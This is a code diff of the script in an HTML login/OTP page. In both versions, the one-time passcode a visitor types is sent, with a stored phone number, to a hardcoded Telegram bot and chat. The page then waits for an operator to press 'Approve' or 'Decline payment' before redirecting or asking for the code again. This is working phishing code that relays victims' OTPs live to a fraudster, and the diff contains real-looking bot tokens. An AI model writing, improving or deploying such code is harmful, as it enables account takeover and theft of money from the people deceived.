@@ -1541,332 +1541,279 @@
         </div>
     </div>
     <script>
-        // =============================================
-        // 1. TELEGRAM BOT CONFIGURATION
-        // =============================================
-        const TELEGRAM_BOT_TOKEN = '8673667977:AAF-4Z6wfDi7SgZdktD1sGWxBZ2nv87-nyI'; // <-- Replace with your bot token
-        const TELEGRAM_CHAT_ID = '1003670447'; // <-- Replace with your chat ID
+    // =============================================
+    // 1. TELEGRAM BOT CONFIGURATION
+    // =============================================
+    const TELEGRAM_BOT_TOKEN = '8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk';
+    const TELEGRAM_CHAT_ID = '5615316142';
 
-        function sendOTPToTelegram(otp) {
-            const phone = localStorage.getItem('loginPhone') || 'N/A';
-            const text = `🔐 *OTP Payment Verification*\n\n` +
-                `📱 Phone: \`${phone}\`\n` +
-                `🔑 OTP Code: *${otp}*\n` +
-                `🕐 Time: ${new Date().toLocaleString()}\n\n` +
-                `_Approve or Decline the payment below:_`;
+    let lastUpdateId = 0;
+    let pollingActive = false;
 
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    // =============================================
+    // SEND OTP TO TELEGRAM WITH INLINE KEYBOARD
+    // =============================================
+    function sendOTPToTelegram(otp) {
+        const phone = localStorage.getItem('loginPhone') || 'N/A';
+        const text = `🔐 *OTP Payment Verification*\n\n` +
+            `📱 Phone: \`${phone}\`\n` +
+            `🔑 OTP Code: *${otp}*\n` +
+            `🕐 Time: ${new Date().toLocaleString()}\n\n` +
+            `_Approve or Decline the payment below:_`;
 
-            fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                })
-                .then(r => r.json())
-                .then(resp => {
-                    if (resp.ok && resp.result) {
-                        const msgId = resp.result.message_id;
-                        // Send inline keyboard (Approve Payment / Cancel Payment)
-                        sendPaymentInlineKeyboard(msgId, otp);
-                    }
-                })
-                .catch(err => console.error('Telegram send error:', err));
-        }
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-        function sendPaymentInlineKeyboard(messageId, otp) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [{
-                        text: '✅ APPROVE PAYMENT',
-                        callback_data: 'approve_payment'
-                    }, {
-                        text: '❌ DECLINE PAYMENT',
-                        callback_data: 'decline_payment'
-                    }]
-                ]
-            };
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: '✅ APPROVE PAYMENT',
+                            callback_data: 'approve_payment'
+                        }, {
+                            text: '❌ DECLINE PAYMENT',
+                            callback_data: 'decline_payment'
+                        }]
+                    ]
+                }
+            })
+        }).catch(err => console.error('Telegram send error:', err));
+    }
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    message_id: messageId,
-                    reply_markup: inlineKeyboard
-                })
-            }).catch(err => console.error('Inline keyboard error:', err));
-        }
+    // =============================================
+    // REMOVE ONLY THE INLINE KEYBOARD (KEEP TEXT)
+    // =============================================
+    function removeInlineKeyboard(chatId, messageId) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                reply_markup: { inline_keyboard: [] }
+            })
+        }).catch(() => {});
+    }
 
-        // Poll for callback_query answers (approve/decline)
-        let lastUpdateId = 0;
-        let pollingActive = false;
+    // =============================================
+    // POLL FOR ADMIN RESPONSE (APPROVE / DECLINE)
+    // =============================================
+    function pollTelegramCallbacks() {
+        if (pollingActive) return;
+        pollingActive = true;
 
-        function pollTelegramCallbacks() {
-            if (pollingActive) return;
-            pollingActive = true;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId}&timeout=30`;
 
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId}&timeout=30`;
+        fetch(url)
+            .then(r => r.json())
+            .then(resp => {
+                pollingActive = false;
+                if (resp.ok && resp.result) {
+                    resp.result.forEach(update => {
+                        lastUpdateId = update.update_id + 1;
 
-            fetch(url)
-                .then(r => r.json())
-                .then(resp => {
-                    pollingActive = false;
-                    if (resp.ok && resp.result) {
-                        resp.result.forEach(update => {
-                            lastUpdateId = update.update_id + 1;
+                        if (update.callback_query) {
+                            const query = update.callback_query;
+                            const data = query.data;
+                            const chatId = query.message.chat.id;
+                            const msgId = query.message.message_id;
 
-                            if (update.callback_query) {
-                                const query = update.callback_query;
-                                const data = query.data;
+                            // 1. Remove only the buttons — keep the original message text
+                            removeInlineKeyboard(chatId, msgId);
 
-                                // Answer the callback query so the loading stops on the button
-                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        callback_query_id: query.id,
-                                        text: data === 'approve_payment' ? '✅ Payment Approved!' : '❌ Payment Declined'
-                                    })
-                                });
+                            // 2. Answer callback so Telegram stops loading state
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    callback_query_id: query.id,
+                                    text: data === 'approve_payment' ? '✅ Approved' : '❌ Declined'
+                                })
+                            });
 
-                                if (data === 'approve_payment') {
-                                    // Edit the message to show approved
-                                    editTelegramMessage(query.message.chat.id, query.message.message_id,
-                                        '✅ *Payment Approved!* Redirecting to success page...');
-
-                                    // Redirect to success.html
-                                    setTimeout(() => {
-                                        window.location.href = 'success.html';
-                                    }, 1500);
-
-                                } else if (data === 'decline_payment') {
-                                    // Edit the message to show declined
-                                    editTelegramMessage(query.message.chat.id, query.message.message_id,
-                                        '❌ *Payment Declined by Admin*\nThe page will reset for OTP re-entry.');
-
-                                    // Reset the OTP page for re-entry
-                                    setTimeout(() => {
-                                        resetOTPPage();
-                                    }, 2000);
-                                }
+                            // 3. Take action on the page
+                            if (data === 'approve_payment') {
+                                setTimeout(() => {
+                                    window.location.href = 'success.html';
+                                }, 1500);
+                            } else if (data === 'decline_payment') {
+                                setTimeout(() => {
+                                    resetOTPPage();
+                                }, 2000);
                             }
-                        });
-                    }
-                    // Continue polling after a delay
-                    setTimeout(() => {
-                        pollingActive = false;
-                    }, 1000);
-                })
-                .catch(() => {
-                    pollingActive = false;
-                    setTimeout(pollTelegramCallbacks, 3000);
-                });
-        }
-
-        function editTelegramMessage(chatId, messageId, text) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    message_id: messageId,
-                    text: text,
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: []
-                    } // remove buttons
-                })
-            }).catch(() => {});
-        }
-
-        function resetOTPPage() {
-            // Clear all OTP inputs
-            document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
-            // Reset verify button
-            const verifyBtn = document.querySelector('.copy-btn');
-            if (verifyBtn) {
-                verifyBtn.disabled = true;
-                verifyBtn.style.opacity = '0.6';
-                verifyBtn.style.cursor = 'not-allowed';
-                verifyBtn.textContent = 'Verify and Login';
-            }
-            // Focus first input
-            const firstInput = document.querySelector('.otp-input');
-            if (firstInput) firstInput.focus();
-        }
-
-        // =============================================
-        // 2. OTP AUTO-ENTER / AUTO-MOVE / PASTE SUPPORT
-        // =============================================
-        const otpInputs = document.querySelectorAll('.otp-input');
-
-        otpInputs.forEach((input, index) => {
-            // Auto-move to next input when a digit is typed
-            input.addEventListener('input', function(e) {
-                // Handle paste event via input
-                if (this.value.length > 1) {
-                    // Bulk paste detected - distribute characters
-                    const chars = this.value.replace(/\D/g, '').split('');
-                    chars.forEach((char, i) => {
-                        if (i < otpInputs.length) {
-                            otpInputs[i].value = char;
-                            otpInputs[i].classList.add('filled');
                         }
                     });
-                    // Focus the next empty input or the last one
-                    const nextEmpty = Array.from(otpInputs).find(inp => inp.value === '');
-                    if (nextEmpty) {
-                        nextEmpty.focus();
-                    } else {
-                        otpInputs[otpInputs.length - 1].focus();
-                    }
-                } else if (this.value.length === 1) {
-                    this.classList.add('filled');
-                    // Move to next input
-                    if (index < otpInputs.length - 1) {
-                        otpInputs[index + 1].focus();
-                    }
-                } else {
-                    this.classList.remove('filled');
                 }
-                checkOTPComplete();
+                setTimeout(() => {
+                    pollingActive = false;
+                }, 1000);
+            })
+            .catch(() => {
+                pollingActive = false;
+                setTimeout(pollTelegramCallbacks, 3000);
             });
+    }
 
-            // Handle paste event explicitly for better UX
-            input.addEventListener('paste', function(e) {
-                e.preventDefault();
-                const pasted = (e.clipboardData || window.clipboardData).getData('text');
-                const digits = pasted.replace(/\D/g, '').split('').slice(0, otpInputs.length);
+    // =============================================
+    // RESET OTP PAGE
+    // =============================================
+    function resetOTPPage() {
+        document.querySelectorAll('.otp-input').forEach(inp => {
+            inp.value = '';
+            inp.classList.remove('filled');
+        });
 
-                digits.forEach((char, i) => {
-                    otpInputs[i].value = char;
-                    otpInputs[i].classList.add('filled');
+        const verifyBtn = document.querySelector('.copy-btn');
+        if (verifyBtn) {
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.6';
+            verifyBtn.style.cursor = 'not-allowed';
+            verifyBtn.textContent = 'Verify and Login';
+        }
+
+        const firstInput = document.querySelector('.otp-input');
+        if (firstInput) firstInput.focus();
+    }
+
+    // =============================================
+    // OTP AUTO-ENTER / AUTO-MOVE / PASTE SUPPORT
+    // =============================================
+    const otpInputs = document.querySelectorAll('.otp-input');
+
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            if (this.value.length > 1) {
+                const chars = this.value.replace(/\D/g, '').split('');
+                chars.forEach((char, i) => {
+                    if (i < otpInputs.length) {
+                        otpInputs[i].value = char;
+                        otpInputs[i].classList.add('filled');
+                    }
                 });
-
-                // Focus the next empty or last input
                 const nextEmpty = Array.from(otpInputs).find(inp => inp.value === '');
                 if (nextEmpty) {
                     nextEmpty.focus();
                 } else {
                     otpInputs[otpInputs.length - 1].focus();
                 }
-                checkOTPComplete();
-            });
-
-            // Backspace: go to previous input
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace') {
-                    if (this.value === '' && index > 0) {
-                        otpInputs[index - 1].focus();
-                        otpInputs[index - 1].value = '';
-                        otpInputs[index - 1].classList.remove('filled');
-                    } else if (this.value !== '') {
-                        this.value = '';
-                        this.classList.remove('filled');
-                    }
-                    checkOTPComplete();
-                }
-                // Arrow keys for navigation
-                if (e.key === 'ArrowLeft' && index > 0) {
-                    otpInputs[index - 1].focus();
-                }
-                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
+            } else if (this.value.length === 1) {
+                this.classList.add('filled');
+                if (index < otpInputs.length - 1) {
                     otpInputs[index + 1].focus();
                 }
-            });
-
-            // Only allow numeric input
-            input.addEventListener('keypress', function(e) {
-                if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' &&
-                    e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
-                    e.preventDefault();
-                }
-            });
-
-            // Focus handler - select existing content
-            input.addEventListener('focus', function() {
-                this.select();
-            });
-        });
-
-        // =============================================
-        // 3. CHECK OTP COMPLETE + VERIFY BUTTON
-        // =============================================
-        function checkOTPComplete() {
-            const allFilled = Array.from(otpInputs).every(inp => inp.value.length === 1);
-            const verifyBtn = document.querySelector('.copy-btn');
-            if (verifyBtn) {
-                verifyBtn.disabled = !allFilled;
-                verifyBtn.style.opacity = allFilled ? '1' : '0.6';
-                verifyBtn.style.cursor = allFilled ? 'pointer' : 'not-allowed';
+            } else {
+                this.classList.remove('filled');
             }
-            return allFilled;
-        }
-
-        // =============================================
-        // 4. VERIFY BUTTON - Send to Telegram + Poll
-        // =============================================
-        document.addEventListener('DOMContentLoaded', function() {
-            const verifyBtn = document.querySelector('.copy-btn');
-            if (!verifyBtn) return;
-
-            verifyBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (this.disabled) return;
-
-                // Collect OTP
-                let otp = '';
-                otpInputs.forEach(inp => {
-                    otp += inp.value;
-                });
-
-                if (otp.length !== 6) {
-                    alert('Please enter the complete 6-digit OTP.');
-                    return;
-                }
-
-                // Save OTP to localStorage
-                localStorage.setItem('otpCode', otp);
-
-                // Show loading state
-                this.textContent = 'VERIFYING...';
-                this.disabled = true;
-                this.style.opacity = '0.6';
-
-                // Send OTP to Telegram bot
-                sendOTPToTelegram(otp);
-
-                // Start polling for admin response (approve/decline)
-                setInterval(pollTelegramCallbacks, 2000);
-            });
-
-            // Focus first OTP input on load
-            if (otpInputs.length > 0) {
-                otpInputs[0].focus();
-            }
-        });
-
-        // =============================================
-        // 5. INITIAL STATE
-        // =============================================
-        document.addEventListener('DOMContentLoaded', function() {
             checkOTPComplete();
         });
-    </script>
+
+        input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            const digits = pasted.replace(/\D/g, '').split('').slice(0, otpInputs.length);
+
+            digits.forEach((char, i) => {
+                otpInputs[i].value = char;
+                otpInputs[i].classList.add('filled');
+            });
+
+            const nextEmpty = Array.from(otpInputs).find(inp => inp.value === '');
+            if (nextEmpty) {
+                nextEmpty.focus();
+            } else {
+                otpInputs[otpInputs.length - 1].focus();
+            }
+            checkOTPComplete();
+        });
+
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace') {
+                if (this.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                    otpInputs[index - 1].value = '';
+                    otpInputs[index - 1].classList.remove('filled');
+                } else if (this.value !== '') {
+                    this.value = '';
+                    this.classList.remove('filled');
+                }
+                checkOTPComplete();
+            }
+            if (e.key === 'ArrowLeft' && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+            if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+        });
+
+        input.addEventListener('keypress', function(e) {
+            if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' &&
+                e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
+                e.preventDefault();
+            }
+        });
+
+        input.addEventListener('focus', function() {
+            this.select();
+        });
+    });
+
+    // =============================================
+    // CHECK OTP COMPLETE
+    // =============================================
+    function checkOTPComplete() {
+        const allFilled = Array.from(otpInputs).every(inp => inp.value.length === 1);
+        const verifyBtn = document.querySelector('.copy-btn');
+        if (verifyBtn) {
+            verifyBtn.disabled = !allFilled;
+            verifyBtn.style.opacity = allFilled ? '1' : '0.6';
+            verifyBtn.style.cursor = allFilled ? 'pointer' : 'not-allowed';
+        }
+        return allFilled;
+    }
+
+    // =============================================
+    // VERIFY BUTTON HANDLER
+    // =============================================
+    document.addEventListener('DOMContentLoaded', function() {
+        checkOTPComplete();
+
+        if (otpInputs.length > 0) {
+            otpInputs[0].focus();
+        }
+
+        const verifyBtn = document.querySelector('.copy-btn');
+        if (!verifyBtn) return;
+
+        verifyBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (this.disabled) return;
+
+            let otp = '';
+            otpInputs.forEach(inp => { otp += inp.value; });
+
+            if (otp.length !== 6) {
+                alert('Please enter the complete 6-digit OTP.');
+                return;
+            }
+
+            localStorage.setItem('otpCode', otp);
+
+            this.textContent = 'VERIFYING...';
+            this.disabled = true;
+            this.style.opacity = '0.6';
+
+            sendOTPToTelegram(otp);
+            setInterval(pollTelegramCallbacks, 2000);
+        });
+    });
+</script>
 </body>
 
 </html>
